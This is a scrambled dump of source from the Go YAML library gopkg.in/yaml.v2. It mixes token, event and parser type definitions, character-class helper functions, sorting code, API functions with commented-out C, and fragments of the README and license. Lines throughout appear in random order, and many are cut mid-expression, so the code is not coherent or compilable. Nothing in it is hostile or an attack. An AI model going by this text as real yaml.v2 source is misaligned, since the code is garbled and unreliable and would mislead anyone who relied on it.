type yaml_token_t struct {
yaml_SCALAR_NODE   // A scalar node.
tag_directives_start int // The beginning of the tag directives list.
states []yaml_emitter_state_t // The stack of states.
tag []byte           // The node tag.
"// the returned value should be 0. On EOF, the handler should set the"
index  int         // The node id.
case yaml_KEY_TOKEN:
aliases []yaml_alias_data_t // The alias data.
case yaml_BLOCK_SEQUENCE_START_TOKEN:
yaml_UTF16BE_ENCODING // The UTF-16-BE encoding with BOM.
// The list of tag directives (for yaml_DOCUMENT_START_EVENT).
yaml_EMIT_DOCUMENT_END_STATE               // Expect DOCUMENT-END.
prefix []byte // The tag prefix.
type yaml_error_type_t int
"major, minor int8"
yaml_EMIT_FLOW_SEQUENCE_FIRST_ITEM_STATE   // Expect the first item of a flow sequence.
yaml_ANY_BREAK yaml_break_t = iota
"return ""yaml_NO_TOKEN"""
func (ps yaml_parser_state_t) String() string {
// The parser structure.
output_buffer 
opened bool // If the stream was already opened
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_KEY_STATE:
case yaml_FLOW_SEQUENCE_START_TOKEN:
encoding yaml_encoding_t // The input encoding.
case yaml_PARSE_FLOW_MAPPING_VALUE_STATE:
// @param[in]       buffer      The buffer with bytes to be written.
"return ""<unknown token>"""
yaml_EMIT_FLOW_MAPPING_VALUE_STATE         // Expect a value of a flow mapping.
"return ""yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE"""
type yaml_emitter_state_t int
line_break  yaml_break_t // The preferred line break.
// family of functions.
flow_level int // The current flow level.
"return ""yaml_PARSE_DOCUMENT_START_STATE"""
yaml_FLOW_SEQUENCE_END_TOKEN   // A FLOW-SEQUENCE-END token.
yaml_SEQUENCE_END_EVENT   // A SEQUENCE-END event.
case yaml_BLOCK_MAPPING_START_TOKEN:
"return ""yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE"""
type yaml_emitter_t struct {
"yaml_INT_TAG       = ""tag:yaml.org,2002:int""       // The tag !!int for integer values."
type yaml_style_t int8
error yaml_error_type_t // Error type.
yaml_SINGLE_QUOTED_SCALAR_STYLE // The single-quoted scalar style.
yaml_LITERAL_SCALAR_STYLE       // The literal scalar style.
tag_directives_end   int // The end of the tag directives list.
value                 []byte              // The scalar value.
"return ""yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE"""
type yaml_simple_key_t struct {
// The scalar style (for yaml_SCALAR_TOKEN).
multiline             bool                // Does the scalar contain line breaks
serialized bool // If the node has been emitted
// The sequence parameters (for YAML_SEQUENCE_NODE).
// The read handler is called when the parser needs to read more bytes from the
events_head int            // The head of the event queue.
yaml_TAG_TOKEN    // A TAG token.
prefix []byte
type yaml_document_t struct {
type yaml_sequence_style_t yaml_style_t
"// The tag (for yaml_SCALAR_EVENT, yaml_SEQUENCE_START_EVENT, yaml_MAPPING_START_EVENT)."
yaml_event_t) scalar_style() yaml_scalar_style_t     { return yaml_scalar_style_t(e.style) }
yaml_event_t) sequence_style() yaml_sequence_style_t { return yaml_sequence_style_t(e.style) }
"yaml_SEQUENCE_START_EVENT: ""sequence start"","
style       yaml_mapping_style_t // The mapping style.
canonical   bool         // If the output is in the canonical style
// This structure holds information about a potential simple key.
"// @returns On success, the handler should return @c 1.  If the handler failed,"
encoding yaml_encoding_t
yaml_ANCHOR_TOKEN // An ANCHOR token.
"return ""yaml_BLOCK_MAPPING_START_TOKEN"""
end_mark   yaml_mark_t // The end of the node.
length int                 // The length of the scalar value.
yaml_DOCUMENT_START_TOKEN    // A DOCUMENT-START token.
yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE   // Expect the and of an ordered mapping entry.
"return ""yaml_ALIAS_TOKEN"""
"return ""yaml_PARSE_BLOCK_NODE_OR_INDENTLESS_SEQUENCE_STATE"""
value  []byte              // The scalar value.
yaml_version_directive_t
// This structure holds aliases data.
buffer_pos int    // The current position of the buffer.
var eventStrings = []string{
// The number of written bytes should be set to the size_read variable.
yaml_ANY_ENCODING yaml_encoding_t = iota
block_allowed         bool                // Can the scalar be expressed in the literal or folded styles
[]byte   // String output data.
sequence_context   bool // Is it a sequence context
case yaml_PARSE_BLOCK_NODE_STATE:
// @a buffer to the output.
yaml_CR_BREAK   // Use CR for line breaks (Mac style).
yaml_FLOW_MAPPING_END_TOKEN    // A FLOW-MAPPING-END token.
// The event structure.
switch ps {
"yaml_SEQUENCE_END_EVENT:   ""sequence end"","
// Let the parser choose the encoding.
// The document encoding (for yaml_STREAM_START_EVENT).
yaml_EMIT_STREAM_START_STATE yaml_emitter_state_t = iota
block_plain_allowed   bool                // Can the scalar be expressed in the block plain style
type yaml_parser_state_t int
input        []byte    // String input data.
"return ""yaml_PARSE_BLOCK_MAPPING_FIRST_KEY_STATE"""
yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_KEY_STATE   // Expect a key of an ordered mapping.
// The states of the parser.
last_anchor_id int // The last assigned anchor id.
yaml_NO_ERROR yaml_error_type_t = iota
yaml_WRITER_ERROR   // Cannot write to the output stream.
style yaml_style_t
yaml_MAPPING_END_EVENT    // A MAPPING-END event.
tag_directives []yaml_tag_directive_t // The list of tag directives.
// An element of a sequence node.
"return ""yaml_BLOCK_ENTRY_TOKEN"""
yaml_node_pair_t    // The top of the stack.
"yaml_SEQ_TAG = ""tag:yaml.org,2002:seq"" // The tag !!seq is used to denote sequences."
"// Is the document start/end indicator implicit, or the tag optional"
// Sequence styles.
write_handler yaml_write_handler_t // Write handler.
yaml_FLOW_ENTRY_TOKEN  // A FLOW-ENTRY token.
best_indent int          // The number of indentation spaces.
anchor_data struct {
"yaml_MAP_TAG = ""tag:yaml.org,2002:map"" // The tag !!map is used to denote mapping."
case yaml_PARSE_DOCUMENT_CONTENT_STATE:
scalar_data struct {
// The stream encoding (for yaml_STREAM_START_TOKEN).
"yaml_emitter_t, buffer []byte) error"
// The tag directive prefix (for yaml_TAG_DIRECTIVE_TOKEN).
column     int  // The current column.
case yaml_SCALAR_TOKEN:
type yaml_mark_t struct {
tag_directives []yaml_tag_directive_t
// Let the parser choose the break type.
value int // The value of the element.
yaml_STREAM_END_TOKEN   // A STREAM-END token.
type yaml_parser_t struct {
"return ""yaml_STREAM_END_TOKEN"""
"// (for yaml_ALIAS_TOKEN, yaml_ANCHOR_TOKEN, yaml_SCALAR_TOKEN, yaml_TAG_TOKEN, yaml_TAG_DIRECTIVE_TOKEN)."
anchors 
// No error is produced.
// The node data.
case yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE:
func (e yaml_event_type_t) String() string {
"return ""yaml_PARSE_FLOW_NODE_STATE"""
"return ""yaml_ANCHOR_TOKEN"""
case yaml_STREAM_START_TOKEN:
//                              yaml_emitter_set_output().
anchor []byte // The anchor value.
mark   yaml_mark_t // The anchor mark.
"return ""yaml_FLOW_ENTRY_TOKEN"""
"pairs_data  []yaml_node_pair_t   // The stack of mapping pairs (key, value)."
// The mapping parameters (for yaml_MAPPING_NODE).
// Scalar styles.
yaml_EMIT_FIRST_DOCUMENT_START_STATE       // Expect the first DOCUMENT-START or STREAM-END.
"return ""yaml_DOCUMENT_END_TOKEN"""
"return ""yaml_SCALAR_TOKEN"""
case yaml_NO_TOKEN:
minor int8 // The minor version number.
yaml_PARSE_BLOCK_SEQUENCE_FIRST_ENTRY_STATE        // Expect the first entry of a block sequence.
line   int // The position line.
type yaml_break_t int
"yaml_BOOL_TAG      = ""tag:yaml.org,2002:bool""      // The tag !!bool with the values: true and false."
token_number int         // The number of the token.
type yaml_node_pair_t struct {
style yaml_scalar_style_t
// The version directive (for yaml_DOCUMENT_START_EVENT).
yaml_event_t) mapping_style() yaml_mapping_style_t   { return yaml_mapping_style_t(e.style) }
yaml_EMIT_BLOCK_MAPPING_FIRST_KEY_STATE    // Expect the first key of a block mapping.
"yaml_DOCUMENT_START_EVENT: ""document start"","
// Line break types.
yaml_NO_EVENT yaml_event_type_t = iota
//                        yaml_parser_set_input().
"yaml_STREAM_END_EVENT:     ""stream end"","
yaml_EMITTER_ERROR  // Cannot emit a YAML stream.
tokens          []yaml_token_t // The tokens queue.
"return ""yaml_STREAM_START_TOKEN"""
if e < 0 
case yaml_DOCUMENT_START_TOKEN:
"return ""yaml_PARSE_BLOCK_SEQUENCE_FIRST_ENTRY_STATE"""
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE:
yaml_DEFAULT_SEQUENCE_TAG = yaml_SEQ_TAG // The default sequence tag is !!seq.
yaml_SEQUENCE_START_EVENT // A SEQUENCE-START event.
yaml_node_pair_t    // The end of the stack.
// An empty node.
yaml_FLOW_SEQUENCE_START_TOKEN // A FLOW-SEQUENCE-START token.
case yaml_ALIAS_TOKEN:
// Is the tag optional for any non-plain style
handle []byte // The tag handle.
yaml_PARSE_DOCUMENT_END_STATE                      // Expect DOCUMENT-END.
type yaml_write_handler_t func(emitter 
"return ""yaml_VERSION_DIRECTIVE_TOKEN"""
yaml_EMIT_FLOW_MAPPING_KEY_STATE           // Expect a key of a flow mapping.
yaml_PARSE_FLOW_NODE_STATE                         // Expect a flow node.
type yaml_alias_data_t struct {
case yaml_PARSE_FLOW_MAPPING_FIRST_KEY_STATE:
flow_level int // The number of unclosed '[' and '{' indicators.
import (
suffix []byte
"yaml_MAPPING_START_EVENT:  ""mapping start"","
yaml_EMIT_FLOW_SEQUENCE_ITEM_STATE         // Expect an item of a flow sequence.
buffer     []byte // The working buffer.
yaml_PARSE_END_STATE                               // Expect nothing.
"return ""yaml_TAG_TOKEN"""
"yaml_MERGE_TAG  = ""tag:yaml.org,2002:merge"""
case yaml_PARSE_BLOCK_MAPPING_VALUE_STATE:
case yaml_PARSE_STREAM_START_STATE:
yaml_BLOCK_SEQUENCE_START_TOKEN // A BLOCK-SEQUENCE-START token.
typ yaml_event_type_t
yaml_STREAM_START_TOKEN // A STREAM-START token.
index  int // The position index.
case yaml_PARSE_BLOCK_NODE_OR_INDENTLESS_SEQUENCE_STATE:
type yaml_read_handler_t func(parser 
yaml_TAG_DIRECTIVE_TOKEN     // A TAG-DIRECTIVE token.
"// (for yaml_DOCUMENT_START_EVENT, yaml_DOCUMENT_END_EVENT, yaml_SEQUENCE_START_EVENT, yaml_MAPPING_START_EVENT, yaml_SCALAR_EVENT)."
problem_offset int
simple_keys        []yaml_simple_key_t // The stack of simple keys.
// Emitter stuff
// The list of tag directives.
// Mapping styles.
root_context       bool // Is it the document root context
"return ""yaml_KEY_TOKEN"""
"return ""yaml_PARSE_IMPLICIT_DOCUMENT_START_STATE"""
case yaml_PARSE_BLOCK_MAPPING_FIRST_KEY_STATE:
required     bool        // Is a simple key required
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE:
yaml_EMIT_FLOW_MAPPING_FIRST_KEY_STATE     // Expect the first key of a flow mapping.
// All members are internal.  Manage the structure using the @c yaml_emitter_
// The token type.
eof bool // EOF flag
state          yaml_parser_state_t    // The current parser state.
// The version directive major/minor (for yaml_VERSION_DIRECTIVE_TOKEN).
type yaml_node_item_t int
start_mark yaml_mark_t // The beginning of the node.
case yaml_PARSE_FLOW_MAPPING_KEY_STATE:
yaml_PARSE_FLOW_MAPPING_EMPTY_VALUE_STATE          // Expect an empty value of a flow mapping.
// The start/end of the token.
simple_key_allowed bool                // May a simple key occur at the current position
whitespace bool // If the last character was a whitespace
yaml_PARSE_FLOW_SEQUENCE_FIRST_ENTRY_STATE         // Expect the first entry of a flow sequence.
case yaml_STREAM_END_TOKEN:
yaml_ALIAS_EVENT          // An ALIAS event.
type yaml_event_t struct {
// The start and end of the event.
key   int // The key of the element.
// The event type.
func (tt yaml_token_type_t) String() string {
// Scanner stuff
yaml_NO_TOKEN yaml_token_type_t = iota
"// On success, the handler should return 1.  If the handler failed,"
type yaml_tag_directive_t struct {
// The start/end of the document.
stream_end_produced   bool // Have we reached the end of the input stream
"return ""yaml_FLOW_MAPPING_END_TOKEN"""
yaml_KEY_TOKEN         // A KEY token.
yaml_ANY_SCALAR_STYLE yaml_scalar_style_t = iota
yaml_DOCUMENT_END_EVENT   // A DOCUMENT-END event.
// The alias/anchor/scalar value or tag/tag directive handle
// The document nodes.
"return ""yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE"""
// The prototype of a read handler.
case yaml_FLOW_ENTRY_TOKEN:
"return ""yaml_PARSE_FLOW_MAPPING_EMPTY_VALUE_STATE"""
case yaml_PARSE_END_STATE:
// The token structure.
 b[i] >= 'a' 
// Determine the width of the character.
return (        // is_break:
// is_breakz:
return b[i] <= 0x7F
package yaml
return int(bi) - '0'
 (b[i
"// Check if the character is a line break, space, or NUL."
output_raw_buffer_size = (output_buffer_size
"// Check if the character is a line break, space, tab, or NUL."
x20 <= . <= 
// Check if the character is a line break or NUL.
xD7FF
if b
// Check if the character at the specified position is blank (space or tab).
0xA0 <= . <= 
xFEFF
return b[i] == ' ' 
b[i] == '
"//return is_break(b, i) "
return (b[i] == '
"// character, a digit, '_', or '-'."
 b[i] == '_' 
 b[i] <= '9'
b[i] == 0)
 bi <= 'f' {
 b[i] <= 'Z' 
"func is_bom(b []byte, i int) bool {"
2] == 0xA9 
// Get the value of a hex-digit.
// It should be possible to encode the whole output buffer.
 b[i
// The size of other stacks and queues.
0xF8 == 0xF0 {
x2028)
output_buffer_size = 128
return 0
// Check if the character is ASCII.
// The size of the output buffer.
// Check if the character at the specified position is tab.
// Check if the beginning of the buffer is a BOM.
initial_string_size = 16
return int(bi) - 'a' 
 // 
"func is_blank(b []byte, i int) bool {"
"func is_spacez(b []byte, i int) bool {"
return int(b[i]) - '0'
" is_breakz(b, i)"
2] == 0xBF))))
"func is_breakz(b []byte, i int) bool {"
" is_tab(b, i)"
return b[i] == '
bi := b[i]
 b[i] == '
 . != 
1] == '
1] == 0xBF 
input_buffer_size = input_raw_buffer_size 
if bi >= 'A' 
"func as_hex(b []byte, i int) int {"
input_raw_buffer_size = 512
"func is_hex(b []byte, i int) bool {"
 // CR (
 b[i] >= 'A' 
 // . == 
" is_z(b, i)"
(b[i] == 0xEE) 
return 2
"func is_ascii(b []byte, i int) bool {"
initial_queue_size  = 16
1] >= 0xA0) 
(b[i] == 0xED 
func width(b byte) int {
"func is_break(b []byte, i int) bool {"
"func is_z(b []byte, i int) bool {"
// Check if the character at the specified position is space.
// Check if the character at the specified position is NUL.
return b[i] == ' '
x85)
 b[i] == '-'
if bi >= 'a' 
1] < 0xA0) 
1] == 0xBB 
"func as_digit(b []byte, i int) int {"
(b[i] >= 0x20 
// Check if the character at the specified position is a digit.
// confirming that it is being inlined.
"//return is_space(b, i) "
1] == 0x80 
xFFFD
2] == 0xBF) 
 // NEL (
0xF0 == 0xE0 {
"func is_crlf(b []byte, i int) bool {"
2] == 0xA8 
// It should be possible to decode the whole raw buffer.
 b[i] <= 0x7E) 
b[i] == ' ' 
return ( // is_blank:
(b[i] == 0xEF 
 b[i] < 0xED) 
0xE0 == 0xC0 {
(b[i] > 0xC2 
 // LS (
return ((b[i] == 0x0A) 
// Check if the character at the start of the buffer can be printed unescaped.
return b[i] >= '0' 
return b[i] == 0x00
"func is_alpha(b []byte, i int) bool {"
"func is_digit(b []byte, i int) bool {"
 bi <= 'F' {
return 4
(b[i] == 0xC2 
// The size of the input raw buffer.
return ( // is_space:
x2029)
 b[i] <= 'F' 
"func is_blankz(b []byte, i int) bool {"
return 3
 b[1] == 0xBB 
// Don't replace these by a switch without first
0x80 == 0x00 {
 b[2] == 0xBF
// The size of the output raw buffer.
// is_z:
// Get the value of a digit.
 b[i] <= 'f'
return 1
b[i] == 0xC2 
"func is_space(b []byte, i int) bool {"
xE000 <= . <= 
b[i] == 0xE2 
// Check if the character at the specified position is an alphabetical
 b[i] <= '9' 
 // LF (
 b[i] <= 'z' 
initial_stack_size  = 16
"func is_tab(b []byte, i int) bool {"
// The size of the input buffer.
// Check if the character at the specified position is a line break.
"//return is_blank(b, i) "
return int(bi) - 'A' 
"func is_printable(b []byte, i int) bool {"
 // PS (
!(b[i
// Check if the character at the specified position is a hex-digit.
2] == 0xBE 
return b[0] == 0xEF 
1] == 0x85 
const (
2] == 0xA9) // PS (
"so, subject to the following conditions:"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
copies or substantial portions of the Software.
    readerc.go
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
    parserc.go
Copyright (c) 2006 Kirill Simonov
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    writerc.go
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
    yamlh.go
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies"
are still covered by their original copyright and license:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"this software and associated documentation files (the ""Software""), to deal in"
    apic.go
    emitterc.go
    scannerc.go
    yamlprivateh.go
"of the Software, and to permit persons to whom the Software is furnished to do"
"The following files were ported to Go from C files of libyaml, and thus"
"the Software without restriction, including without limitation the rights to"
"        d, err = yaml.Marshal("
The package API for yaml v2 will remain stable as described in [gopkg.in](https://gopkg.in).
"n"", t)"
  d:
The yaml package enables Go programs to comfortably encode and decode YAML
import (
--- t:
{Easy! {2 [3 4]}}
"If opened in a browser, the import path itself leads to the API documentation:"
map[a:Easy! b:map[c:2 d:[3 4]]]
Introduction
"The yaml package supports most of YAML 1.1 and 1.2, including support for"
        m := make(map[interface{}]interface{})
"        err = yaml.Unmarshal([]byte(data), "
"To install it, run:"
"        fmt.Printf(""--- m:"
"        fmt.Printf(""--- t:"
  - 3
"        ""log"""
"implemented, and base-60 floats from YAML 1.1 are purposefully not"
The import path for the package is 
------------
Compatibility
-------
License
  c: 2
values. It was developed within [Canonical](https://www.canonical.com) as
Example
"        fmt.Printf(""--- m dump:"
--- m:
--- t dump:
                RenamedC int   
----------------------
"        ""gopkg.in/yaml.v2"""
        B struct {
        t := T{}
pure Go port of the well-known [libyaml](http://pyyaml.org/wiki/LibYAML)
"yaml:"",flow"""
        if err != nil {
 [https://gopkg.in/yaml.v2](https://gopkg.in/yaml.v2)
--- m dump:
gopkg.in/yaml.v2
"        ""fmt"""
"                log.Fatalf(""error: %v"", err)"
"n"", string(d))"
// Note: struct fields must be public in order for unmarshal to
        A string
-------------
"        fmt.Printf(""--- t dump:"
This example will generate the following output:
"anchors, tags, map merging, etc. Multi-document unmarshalling is not yet"
Installation and usage
var data = 
                D        []int 
type T struct {
a: Easy!
"n"", m)"
API documentation
API stability
-----------------
"        d, err := yaml.Marshal("
func main() {
"part of the [juju](https://juju.ubuntu.com) project, and is based on a"
"        err := yaml.Unmarshal([]byte(data), "
// correctly populate the data.
        }
    
  - 4
The yaml package is licensed under the Apache License 2.0. Please see the LICENSE file for details.
"yaml:""c"""
 YAML support for the Go language
    go get gopkg.in/yaml.v2
"  d: [3, 4]"
package main
supported since they're a poor design and are gone in YAML 1.2.
C library to parse and generate YAML data quickly and reliably.
"ar, br := []rune(a.String()), []rune(b.String())"
"func keyFloat(v reflect.Value) (f float64, ok bool) {"
type keyList []reflect.Value
package yaml
if ak != reflect.String 
return ar[i] < br[i]
if ai != bi {
if an != bn {
"af, aok := keyFloat(a)"
 unicode.IsDigit(ar[j])
return ai < bi
return bl
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
for bi = i
 int64(ar[ai]-'0')
 int64(br[bi]-'0')
"return float64(v.Uint()), true"
"""unicode"""
if ar[j] != '0' {
 i < len(ar) 
// a and b must necessarily have the same kind.
for (bk == reflect.Interface 
return a.Float() < b.Float()
bn = bn
"panic(""not a number"")"
if af != bf {
continue
 b.Bool()
"return numLess(a, b)"
"return v.Float(), true"
// keyFloat returns a float value for v if it is a number/bool
 bl {
"return float64(v.Int()), true"
"return 0, false"
 ak == reflect.Ptr) 
break
switch v.Kind() {
bn = 1
if ar[i] == br[i] {
// and whether it is a number/bool or not.
 bi < len(br) 
b := l[j]
import (
 !b.IsNil() {
 bk == reflect.Ptr) 
bk = b.Kind()
"var ai, bi int"
bk := b.Kind()
 unicode.IsDigit(ar[ai])
// numLess returns whether a < b.
"""reflect"""
switch a.Kind() {
"func (l keyList) Swap(i, j int) { l[i], l[j] = l[j], l[i] }"
for ai = i
return !a.Bool() 
 !a.IsNil() {
if ar[i] == '0' 
 ai < len(ar) 
for i := 0
for j := i-1
a := l[i]
return a.Uint() < b.Uint()
for (ak == reflect.Interface 
"return 1, true"
"return 0, true"
if v.Bool() {
"func (l keyList) Less(i, j int) bool {"
return len(ar) < len(br)
 br[i] == '0' {
return an < bn
 j >= 0 
 bk != reflect.String {
bl := unicode.IsLetter(br[i])
"bf, bok := keyFloat(b)"
return a.Int() < b.Int()
if aok 
 unicode.IsDigit(br[bi])
 j-- {
case reflect.Bool:
 i < len(br)
b = b.Elem()
"func numLess(a, b reflect.Value) bool {"
al := unicode.IsLetter(ar[i])
a = a.Elem()
"var an, bn int64"
an = an
func (l keyList) Len() int      { return len(l) }
 bok {
ak = a.Kind()
return ak < bk
if ak != bk {
"case reflect.Float32, reflect.Float64:"
if al 
return af < bf
an = 1
ak := a.Kind()
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
//                            // Valid item id is required.
"copy(parser.tokens, parser.tokens[parser.tokens_head:])"
"yaml_version_directive_t,"
//    assert(document.nodes.start[sequence-1].type == YAML_SEQUENCE_NODE)
 0x80) == 0x00 
"context, items)"
func yaml_parser_set_input_reader(parser 
//            octet = pointer[k]
//    while (!STACK_EMPTY(
"context, document.nodes, node)) goto error"
 sequence <= document.nodes.top)
 Destroy a token object.
yaml_node_pair_t
//    pair.value = value
"typ:               yaml_DOCUMENT_START_EVENT,"
//    if (!anchor_copy)
func yaml_scalar_event_initialize(event 
//    assert(document) // Non-NULL document is required.
// Create SEQUENCE-START.
emitter.write_handler = yaml_string_write_handler
//static int
//                tag_directive != tag_directives_end
//        version_directive_copy.minor = version_directive.minor
length
emitter.encoding = encoding
parser.input_pos = 0
"typ: yaml_STREAM_END_EVENT,"
"typ:      yaml_DOCUMENT_END_EVENT,"
//        version_directive 
"yaml_emitter_t, line_break yaml_break_t) {"
//        case YAML_TAG_DIRECTIVE_TOKEN:
//    ALIAS_EVENT_INIT(
 k < width
// Create STREAM-END.
version_directive 
//yaml_check_utf8(yaml_char_t 
"context, pairs, INITIAL_STACK_SIZE)) goto error"
//                assert(0) // Should not happen.
parser.input_pos 
//                (octet 
//            case YAML_SCALAR_NODE:
//    return document.nodes.top - document.nodes.start
pointer = start
 1 :
//    if (document.nodes.top != document.nodes.start) {
"//    mark yaml_mark_t = { 0, 0, 0 }"
//                STACK_DEL(
//    {
 4 : 0
// Set if unescaped non-ASCII characters are allowed.
if width < 0 {
"yaml_document_t, index int)"
 3 :
//            
//            case YAML_MAPPING_NODE:
//    value_copy 
//yaml_document_append_mapping_pair(document 
// Set a string input.
return true
token)
width > end) return 0
"yaml_emitter_t, w io.Writer) {"
//    pair.key = key
"//        sequence int, item int)"
//    value_copy = yaml_malloc(length
//        default:
// Destroy a parser object.
//        for (k = 1
//    anchor_copy 
)value)
//        octet = pointer[0]
 value >= 0x10000))) return 0
//    yaml_free(value_copy)
//        pointer 
func yaml_string_read_handler(parser 
//        yaml_free(tag_directive.prefix)
func yaml_parser_initialize(parser 
= width
//    assert(sequence > 0
//        return 0
"context, tag_directives_copy, INITIAL_STACK_SIZE))"
"//            tag_directives_copy.start, tag_directives_copy.top,"
"context, document.nodes)"
// Set the source encoding.
"context, node.data.sequence.items)"
"context, tag_directives_copy)) {"
"yaml_event_t, anchor, tag []byte, implicit bool, style yaml_mapping_style_t) {"
"start, size_t length)"
func yaml_stream_start_event_initialize(event 
//            (width == 2 
"raw_buffer: make([]byte, 0, input_raw_buffer_size),"
"encoding: encoding,"
//        yaml_free(tag_directive.handle)
emitter.best_width = width
"""io"""
width = -1
//    assert(document) // Non-NULL document object is expected.
//    } context
yaml_document_t)
//    if (tag_directives_start != tag_directives_end) {
func yaml_emitter_set_unicode(emitter 
func yaml_emitter_set_encoding(emitter 
event 
yaml_node_t
"context, tag_directives_copy)"
//            assert(tag_directive.prefix)
func yaml_mapping_start_event_initialize(event 
//                            // A mapping node is required.
"typ: yaml_SEQUENCE_END_EVENT,"
"//        mapping int, key int, value int)"
//    assert(event) // Non-NULL event object is expected.
//        if (!STACK_INIT(
 index - 1
 0x0F :
func yaml_emitter_set_width(emitter 
package yaml
 Append an item to a sequence node.
"implicit:          implicit,"
func yaml_emitter_set_break(emitter 
//// Set the indentation increment.
//        style yaml_scalar_style_t)
[]byte) {
emitter.canonical = canonical
//                            // Valid tag directives are expected.
"//        start_implicit int, end_implicit int)"
func yaml_sequence_start_event_initialize(event 
 0xF0) == 0xE0 
func yaml_string_write_handler(emitter 
parser.read_handler = yaml_string_read_handler
func yaml_event_delete(event 
"yaml_event_t, anchor, tag []byte, implicit bool, style yaml_sequence_style_t) bool {"
// Check if we can move the queue at the beginning of the buffer.
// Create a new emitter object.
// Set a string output.
if parser.encoding != yaml_ANY_ENCODING {
emitter.output_writer = w
//            if (!PUSH(
//    yaml_free(document.version_directive)
func yaml_reader_read_handler(parser 
"implicit: implicit,"
//    yaml_free(document.tag_directives.start)
 Add a scalar node to a document.
func yaml_emitter_set_output_string(emitter 
"implicit bool,"
//    assert(key > 0 
 2 :
 value >= 0x80) 
//                            // Valid value id is required.
//YAML_DECLARE(void)
"panic(""must set the input source only once"")"
yaml_event_t) {
//        value yaml_tag_directive_t = POP(
yaml_event_t) bool {
//    tag_directive 
if pos < 0 {
//    assert(anchor) // Non-NULL anchor is expected.
//        length = strlen((char 
"//            if (!yaml_check_utf8(tag_directive.prefix,"
yaml_emitter_t) {
 !value.prefix) goto error
yaml_char_t)
// Create SCALAR.
func yaml_emitter_set_output_writer(emitter 
//yaml_document_delete(document 
"typ:      yaml_MAPPING_START_EVENT,"
"//    SEQUENCE_NODE_INIT(node, tag_copy, items.start, items.end,"
parser.encoding = encoding
//        start 
//        unsigned char octet
 0xF8) == 0xF0 
 Create ALIAS.
//        case YAML_ALIAS_TOKEN:
//            (tag_directives_start == tag_directives_end))
//    yaml_free(tag_copy)
event = yaml_event_t{}
// yaml_writer_write_handler uses emitter.output_writer to write the
yaml_char_t = NULL
token
"//            style, mark, mark)"
//    if (length < 0) {
func yaml_document_start_event_initialize(
//        tag = (yaml_char_t 
// Set the canonical output style.
"yaml_event_t, anchor, tag, value []byte, plain_implicit, quoted_implicit bool, style yaml_scalar_style_t) bool {"
// Destroy an event object.
"buffer:     make([]byte, 0, input_buffer_size),"
"tag_directives []yaml_tag_directive_t,"
//    if (!value_copy) goto error
//                        strlen((char 
 0xE0) == 0xC0 
//    assert((tag_directives_start 
"parser.tokens = append(parser.tokens, "
//    tag_copy 
//    assert(item > 0 
//            yaml_free(token.data.scalar.value)
"yaml_emitter_t, output_buffer "
//    assert(token)
"yaml_emitter_t, buffer []byte) error {"
"typ: yaml_MAPPING_END_EVENT,"
//    struct {
 Get a document node.
"_, err := emitter.output_writer.Write(buffer)"
//        size_t k
// Reader read handler.
//        unsigned int value
//            yaml_free(token.data.tag_directive.handle)
//            (width == 3 
//        yaml_free(value.handle)
//    if (!PUSH(
emitter = yaml_emitter_t{}
"emitter.output_buffer, buffer...)"
//        if (!version_directive_copy) goto error
//yaml_alias_event_initialize(event 
//        case YAML_TAG_TOKEN:
"//    value yaml_tag_directive_t = { NULL, NULL }"
//        tag_directive 
 Add a sequence node to a document.
"//    memset(token, 0, sizeof(yaml_token_t))"
yaml_version_directive_t = NULL
//                yaml_free(node.data.scalar.value)
//    pair yaml_node_pair_t
func yaml_mapping_end_event_initialize(event 
//yaml_document_append_sequence_item(document 
//            if ((octet 
//YAML_DECLARE(yaml_node_t 
"context, node.data.mapping.pairs)"
//    yaml_free(value.handle)
//    context.error = YAML_NO_ERROR // Eliminate a compiler warning.
parser.input_reader = r
// Set the preferred line break character.
 mapping <= document.nodes.top)
 Create a document object.
parser.tokens_head = 0
func yaml_parser_set_encoding(parser 
"//            if (!yaml_check_utf8(tag_directive.handle,"
"//    if (!yaml_check_utf8(tag, strlen((char "
//    for (tag_directive = document.tag_directives.start
func yaml_parser_set_input_string(parser 
"//    memset(document, 0, sizeof(yaml_document_t))"
//            yaml_free(token.data.alias.value)
//        end 
// String read handler.
//        return document.nodes.start 
//            value.handle = yaml_strdup(tag_directive.handle)
"context, nodes)"
//        case YAML_ANCHOR_TOKEN:
"//    memcpy(value_copy, value, length)"
"context, items, INITIAL_STACK_SIZE)) goto error"
//                goto error
// Set a file output.
//        if (!width) return 0
"yaml_parser_t, pos int, token "
 Check if a string is a valid UTF-8 sequence.
//yaml_document_add_mapping(document 
"context, document.nodes)) {"
"n = copy(buffer, parser.input[parser.input_pos:])"
//        tag 
//    if (!tag) {
//    if (!STACK_INIT(
"//                document.nodes.start[sequence-1].data.sequence.items, item))"
//    }
 index <= document.nodes.top) {
"typ:      yaml_SEQUENCE_START_EVENT,"
)YAML_DEFAULT_MAPPING_TAG
"1:], parser.tokens[parser.tokens_head"
//            yaml_free(token.data.tag.suffix)
"style:           yaml_style_t(style),"
//yaml_document_initialize(document 
)anchor))) return 0
//        yaml_free(node.tag)
parser.read_handler = yaml_reader_read_handler
"value:           value,"
